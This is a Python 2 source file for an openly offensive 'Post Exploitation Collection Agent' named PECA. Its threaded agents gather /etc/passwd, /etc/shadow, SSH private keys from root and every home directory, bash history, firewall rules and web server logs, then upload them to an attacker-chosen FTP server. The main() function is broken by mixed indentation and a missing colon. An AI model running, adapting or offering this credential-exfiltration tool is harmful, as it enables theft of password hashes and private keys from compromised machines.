import os
import socket
import ftplib
import threading
import imp

try:
    imp.find_module('optparse')
    from optparse import OptionParser
    use_opt_parser = True
except ImportError:
    use_opt_parser = False

def check_if_directory_exist(session, directory):
    filelist = []
    print "[*] Checking if directory %s exists" % directory
    session.retrlines('LIST', filelist.append)
    for f in filelist:
        if f.split()[-1] == directory:
            return True
    return False


class PasswdShadowGroupAgent(threading.Thread):
    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
        self.agentName = "Passwd/Shadow/Group Agent"
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.module_path = "PasswdShadowGroup"
        self.session = None
        self.coredirectory = core_directory

        threading.Thread.__init__(self)

    def run(self):
        print "[-] Starting %s Agent" % self.agentName
        self.connect_to_ftp()
        try:
            self.run_task()
        except:
            #Only to preserve other task
            print '[!] Error occured in %s' % self.agentName
        self.session.quit()
        print "[#] %s Finished" % self.agentName

    def connect_to_ftp(self):
        self.session = ftplib.FTP()
        self.session.connect(self.ftpserver, self.ftpport)
        self.session.login(self.ftpuser, self.ftppass)
        self.session.cwd(self.coredirectory)
        self.create_folder()
        self.session.cwd(self.module_path)

    def create_folder(self):
        if check_if_directory_exist(self.session, self.module_path):
            pass
        else:
            # Create folder
            self.session.mkd(self.module_path)

    def upload_file(self, filepath, binary):
        # Delete old file
        try:
            self.session.delete(os.path.basename(filepath))
        except:
            pass
        # Store new file
        if binary:
            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
        else:
            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))

    def run_task(self):
        self.upload_file("/etc/passwd", False)
        self.upload_file("/etc/shadow", False)
        self.upload_file("/etc/group", False)


class SSHKeyAgent(threading.Thread):
    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
        self.agentName = "SSHKey Agent"
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.module_path = "SSH"
        self.session = None
        self.coredirectory = core_directory

        threading.Thread.__init__(self)

    def run(self):
        print "[-] Starting %s Agent" % self.agentName
        self.connect_to_ftp()
        try:
            self.run_task()
        except:
            print '[!] Error occured in %s' % self.agentName
        self.session.quit()
        print "[#] %s Finished" % self.agentName

    def connect_to_ftp(self):
        self.session = ftplib.FTP()
        self.session.connect(self.ftpserver, self.ftpport)
        self.session.login(self.ftpuser, self.ftppass)
        self.session.cwd(self.coredirectory)
        self.create_folder()
        self.session.cwd(self.module_path)

    def create_folder(self):
        if check_if_directory_exist(self.session, self.module_path):
            pass
        else:
            # Create folder
            self.session.mkd(self.module_path)

    def upload_file(self, filepath, binary):
        # Delete old file
        try:
            self.session.delete(os.path.basename(filepath))
        except:
            pass
        # Store new file
        if binary:
            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
        else:
            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))

    def do_root_check(self):
        # Create working folder
        if check_if_directory_exist(self.session, "root"):
            pass
        else:
            # Create folder
            self.session.mkd("root")
        self.session.cwd("root")
        for file in os.listdir("/root"):
            if file == ".ssh":
                for file in os.listdir("/root/.ssh/"):
                    self.upload_file("/root/.ssh/"+file, False)
        self.session.cwd("../")

    def do_home_check(self):
        for homefoldername in os.listdir("/home/"):
            if os.path.isdir("/home/"+homefoldername):
                # Check if the directory exit
                if check_if_directory_exist(self.session, homefoldername):
                    pass
                else:
                    # Create folder
                    self.session.mkd(homefoldername)
                self.session.cwd(homefoldername)
                for foldersinhome in os.listdir("/home/"+homefoldername):
                    if foldersinhome == ".ssh":
                        for filesinhome in os.listdir("/home/"+homefoldername+"/"+foldersinhome):
                            self.upload_file("/home/"+homefoldername+"/"+foldersinhome+"/"+filesinhome, False)
                self.session.cwd("../")
        self.session.cwd("../")

    def run_task(self):
        self.do_root_check()
        self.do_home_check()


class IPTablesAgent(threading.Thread):
    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
        self.agentName = "IPTables Agent"
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.module_path = "IPTables"
        self.session = None
        self.coredirectory = core_directory

        threading.Thread.__init__(self)

    def run(self):
        print "[-] Starting %s Agent" % self.agentName
        self.connect_to_ftp()
        try:
            self.run_task()
        except:
            #Only to preserve other task
            print '[!] Error occured in %s' % self.agentName
        self.session.quit()
        print "[#] %s Finished" % self.agentName

    def connect_to_ftp(self):
        self.session = ftplib.FTP()
        self.session.connect(self.ftpserver, self.ftpport)
        self.session.login(self.ftpuser, self.ftppass)
        self.session.cwd(self.coredirectory)
        self.create_folder()
        self.session.cwd(self.module_path)

    def create_folder(self):
        if check_if_directory_exist(self.session, self.module_path):
            pass
        else:
            # Create folder
            self.session.mkd(self.module_path)

    def upload_file(self, filepath, binary):
        # Delete old file
        try:
            self.session.delete(os.path.basename(filepath))
        except:
            pass
        # Store new file
        if binary:
            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
        else:
            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))

    def run_task(self):
        if os.path.exists("/etc/sysconfig/iptables"):
            self.upload_file("/etc/sysconfig/iptables", False)
        if os.path.exists("/etc/sysconfig/ip6tables"):
            self.upload_file("/etc/sysconfig/ip6tables", False)

class WebServiceLogsAgent(threading.Thread):
    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
        self.agentName = "WebServiceLogs Agent"
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.module_path = "WebServiceLogs"
        self.session = None
        self.coredirectory = core_directory
        self.servicelogdict = { "httpd_etc" : "/etc/httpd/logs/",
								"apache2" : "/var/log/apache2/",
								"apache" : "/var/log/apache/",
								"httpd" : "/var/log/httpd/",
								"lighttpd" : "/var/log/lighttpd/",
								"webmin" : "/var/webmin/",
								"www" : "/var/www/logs"
							  }

        threading.Thread.__init__(self)

    def run(self):
        print "[-] Starting %s Agent" % self.agentName
        self.connect_to_ftp()
        try:
            self.run_task()
        except:
            #Only to preserve other task
            print '[!] Error occured in %s' % self.agentName
        self.session.quit()
        print "[#] %s Finished" % self.agentName

    def connect_to_ftp(self):
        self.session = ftplib.FTP()
        self.session.connect(self.ftpserver, self.ftpport)
        self.session.login(self.ftpuser, self.ftppass)
        self.session.cwd(self.coredirectory)
        self.create_folder()
        self.session.cwd(self.module_path)

    def create_folder(self):
        if check_if_directory_exist(self.session, self.module_path):
            pass
        else:
            # Create folder
            self.session.mkd(self.module_path)

    def upload_file(self, filepath, binary):
        # Delete old file
        try:
            self.session.delete(os.path.basename(filepath))
        except:
            pass
        # Store new file
        if binary:
            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
        else:
            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))

    def run_task(self):
		for key in self.servicelogdict.keys():
			if os.path.exists(self.servicelogdict[key]):
				# Check if the directory exit
				if check_if_directory_exist(self.session, key):
					pass
				else:
					# Create folder
					self.session.mkd(key)
				self.session.cwd(key)
				for conffile in os.listdir(self.servicelogdict[key]):
					self.upload_file(self.servicelogdict[key]+conffile, False)
				self.session.cwd("../")
			
class BashConfigHistoryAgent(threading.Thread):
    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, core_directory):
        self.agentName = "BashConfigHistory Agent"
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.module_path = "BashConfig"
        self.session = None
        self.coredirectory = core_directory

        threading.Thread.__init__(self)

    def run(self):
        print "[-] Starting %s Agent" % self.agentName
        self.connect_to_ftp()
        try:
            self.run_task()
        except:
            print '[!] Error occured in %s' % self.agentName
        self.session.quit()
        print "[#] %s Finished" % self.agentName

    def connect_to_ftp(self):
        self.session = ftplib.FTP()
        self.session.connect(self.ftpserver, self.ftpport)
        self.session.login(self.ftpuser, self.ftppass)
        self.session.cwd(self.coredirectory)
        self.create_folder()
        self.session.cwd(self.module_path)

    def create_folder(self):
        if check_if_directory_exist(self.session, self.module_path):
            pass
        else:
            # Create folder
            self.session.mkd(self.module_path)

    def upload_file(self, filepath, binary):
        # Delete old file
        try:
            self.session.delete(os.path.basename(filepath))
        except:
            pass
        # Store new file
        if binary:
            self.session.storbinary('STOR %s' % os.path.basename(filepath), open(filepath, 'rb'))
        else:
            self.session.storlines('STOR %s' % os.path.basename(filepath), open(filepath, 'r'))

    def do_root_check(self):
        # Create working folder
        if check_if_directory_exist(self.session, "root"):
            pass
        else:
            # Create folder
            self.session.mkd("root")
        self.session.cwd("root")
        for file in os.listdir("/root"):
            if file == ".bash_history" or file == ".bash_logout" or file == ".bashrc":
                self.upload_file("/root/"+file, False)
        self.session.cwd("../")

    def do_home_check(self):
        for homefoldername in os.listdir("/home/"):
            if os.path.isdir("/home/"+homefoldername):
                # Check if the directory exit
                if check_if_directory_exist(self.session, homefoldername):
                    pass
                else:
                    # Create folder
                    self.session.mkd(homefoldername)
                self.session.cwd(homefoldername)
                for foldersinhome in os.listdir("/home/"+homefoldername):
                    if os.path.isfile("/home/"+homefoldername+"/"+foldersinhome):
                        if foldersinhome == ".bash_history" or foldersinhome == ".bash_logout" or foldersinhome == ".bashrc":
                            self.upload_file("/home/"+homefoldername+"/"+foldersinhome, False)
                self.session.cwd("../")
        self.session.cwd("../")

    def run_task(self):
        self.do_root_check()
        self.do_home_check()


class Peca:

    def __init__(self, ftpserver, ftpport, ftpuser, ftppass, folderpath):
        self.ftpserver = ftpserver
        self.ftpport = ftpport
        self.ftpuser = ftpuser
        self.ftppass = ftppass
        self.folderpath = folderpath
        self.session = None
        self.machine_name = socket.gethostname()
        self.agentthreads = []
        self.fullpath = folderpath+"/"+self.machine_name

    def connect_to_ftp(self):
        print "[*] Starting Peca with following "
        print "[*] Performing initial connection test to " + self.ftpserver
        try:
            self.session = ftplib.FTP()
            self.session.connect(self.ftpserver, self.ftpport)
            loginResult = self.session.login(self.ftpuser, self.ftppass)

            print "[*] Connection test passed"

        except:
            print "[!] Error during connection shutting down"
            exit()

        self.check_working_directories()
        self.session.quit()
        print "[*] Spinning up agents"
        self.spin_up_agents()

    def spin_up_agents(self):
        # Add all the thread objects
        self.agentthreads.append(PasswdShadowGroupAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
        self.agentthreads.append(SSHKeyAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
        self.agentthreads.append(IPTablesAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
        self.agentthreads.append(BashConfigHistoryAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))
        self.agentthreads.append(WebServiceLogsAgent(self.ftpserver, self.ftpport, self.ftpuser, self.ftppass, self.fullpath))

        # Start all the threads
        [x.start() for x in self.agentthreads]
        # Wait for all of them to finish
        [y.join() for y in self.agentthreads]

    def check_working_directories(self):

        if check_if_directory_exist(self.session, self.folderpath):
            print "[*] Directory found"
        else:
            print "[*] Directory not found attempting to create"
            try:
                self.session.mkd(self.folderpath)
                print "[*] Directory created"
            except:
                print "[!] Could not create folder"
                print "[!] Need Acess to create folder"
                exit()
        self.session.cwd(self.folderpath)
        if check_if_directory_exist(self.session, self.machine_name):
            print "[*] Directory found"
        else:
            print "[*] Directory not found attempting to create"
            try:
                self.session.mkd(self.machine_name)
                print "[*] Directory created"
            except:
                print "[!] Could not create folder"
                print "[!] Need Access to create folder"
                exit()


def print_banner():
    banner = """
            ____  _______________
           / __ \/ ____/ ____/   |
          / /_/ / __/ / /   / /| |
         / ____/ /___/ /___/ ___ |
        /_/   /_____/\____/_/  |_|
    Post Exploitation Collection Agent
    """
    print banner


def main():
	print_banner()


    if use_opt_parser:
        parser = OptionParser()
        parser.add_option("--server", dest="ftpserver", help="Ftp Server To Connect To [default: %default]", default="127.0.0.1")
        parser.add_option("--port", dest="ftpport", help="FTP Server Port To Connect To [default: %default]", default="21")
        parser.add_option("--user", dest="ftpuser", help="FTP Login Information [default: %default]", default="pecauser")
        parser.add_option("--password", dest="ftppass", help="FTP Password Information [default: %default]", default="pecapass")
        parser.add_option("--folderpath", dest="folderpath", help="FTP Folder Path [default: %default]", default="pub")
        (options, args) = parser.parse_args()

	peca = Peca(options.ftpserver, options.ftpport, options.ftpuser, options.ftppass, options.folderpath)
	peca.connect_to_ftp()

    else
        print "[!] Dynamic options not available using hardcoded"
        # Hard code if dynamic options arn't supported
        options = {}
        options["ftpserver"] = "127.0.0.1"
        options["ftpport"] = "21"
        options["ftpuser"] = "pecauser"
        options["ftppass"] = "pecapass"
        options["folderpath"] = "pub"

        peca = Peca(options["ftpserver"], options["ftpport"], options["ftpuser"], options["ftppass"], options["folderpath"])
        peca.connect_to_ftp()



if __name__ == "__main__":
    main()
